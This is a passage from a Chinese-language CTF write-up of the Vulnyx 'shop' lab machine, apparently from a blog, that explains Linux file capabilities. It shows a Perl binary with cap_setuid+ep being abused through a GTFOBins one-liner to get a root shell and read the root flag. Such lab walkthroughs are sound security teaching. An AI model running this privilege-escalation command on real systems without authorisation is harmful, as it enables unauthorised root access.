                                                                                                                                                                                \nCapPrm:  \u003cspan class=\"hljs-number\"\u003e0x0000000000000000\u003c/span\u003e=                                                                                   \nCapEff:  \u003cspan class=\"hljs-number\"\u003e0x0000000000000000\u003c/span\u003e=                                                                                   \nCapBnd:  \u003cspan class=\"hljs-number\"\u003e0x0000003fffffffff\u003c/span\u003e=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_ra\nw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_wr\nite,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read                                                                                                    \nCapAmb:  \u003cspan class=\"hljs-number\"\u003e0x0000000000000000\u003c/span\u003e=                                                                                                                                                                                                   \n                                                                                                                                                                                                                               \n                                                                                                               \nFiles with \u003cspan class=\"hljs-title function_\"\u003ecapabilities\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(limited to \u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e)\u003c/span\u003e:                                                                                                                                                                                       \n/usr/bin/perl5\u003cspan class=\"hljs-number\"\u003e.28\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e = cap_setuid+ep                                                                                                                                                                                            \n/usr/bin/perl = cap_setuid+ep     \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnyxshop/image36.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ecap_setuid+ep\u003c/code\u003e 是 Linux \u003cstrong\u003ecapabilities\u003c/strong\u003e（能力）的一个权限，具体含义如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ecap_setuid\u003c/code\u003e\u003c/strong\u003e：允许进程更改其自身的 \u003cstrong\u003eUID（User ID）\u003c/strong\u003e，相当于 \u003ccode\u003esetuid()\u003c/code\u003e 系统调用的权限。这意味着即使进程不是 root 用户运行，它仍然可以更改其 UID。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e+ep\u003c/code\u003e\u003c/strong\u003e：\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ee\u003c/code\u003e（Effective）\u003c/strong\u003e：进程可以实际使用 \u003ccode\u003ecap_setuid\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ep\u003c/code\u003e（Permitted）\u003c/strong\u003e：进程拥有该能力。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e可以更改其\u003ccode\u003eUID\u003c/code\u003e ，我们尝试将其改为\u003ccode\u003eroot\u003c/code\u003e ，在\u003ca href=\"https://gtfobins.github.io/gtfobins/perl/%E4%B8%AD%E5%8F%AF%E4%BB%A5%E6%89%BE%E5%88%B0%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95\"\u003ehttps://gtfobins.github.io/gtfobins/perl/中可以找到利用方法\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnyxshop/image37.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行提权，获得root权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-java\"\u003ebart\u003cspan class=\"hljs-meta\"\u003e@shop\u003c/span\u003e:/tmp$ perl -e \u003cspan class=\"hljs-string\"\u003e'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'\u003c/span\u003e\n# id\nuid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) gid=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(bart) grupos=\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e(bart)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnyxshop/image38.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取\u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-java\"\u003e# cat /root/root.txt\n1c4cddb6c20e0e756163b2a9714a1260\n\u003c/code\u003e\u003c/pre\u003e","title":"Vulnyx - shop","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["Vulnyx","Linux靶机"],"categories":"靶机"},"recentPosts":[{"title":"HackTheBox - Machine -Support","slug":"HackTheBoxMachine -Support","date":"2025-06-05","updated":"2025-06-05","isEncrypted":false},{"title":"HackTheBox - Machine - Hospital","slug":"HackTheBoxMachine - Hospital","date":"2025-06-04","updated":"2025-06-04","isEncrypted":false},{"title":"HackTheBox - Season8 - Certificate","slug":"HackTheBoxSeason8 - Certificate","date":"2025-06-02","updated":"2025-06-02","isEncrypted":true},{"title":"HackTheBox - Machine - Strutted","slug":"HackTheBoxMachine - Strutted","date":"2025-06-02","updated":"2025-06-02","isEncrypted":false},{"title":"Vulnyx - Build","slug":"VulnyxBuild","date":"2025-06-01","updated":"2025-06-01","isEncrypted":false}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"03","id":"Vulnyxshop"},"buildId":"O8yDxAWUAaCmi2IKnfptP","isFallback":false,"gsp":true,"scriptLoader":[]}</sc
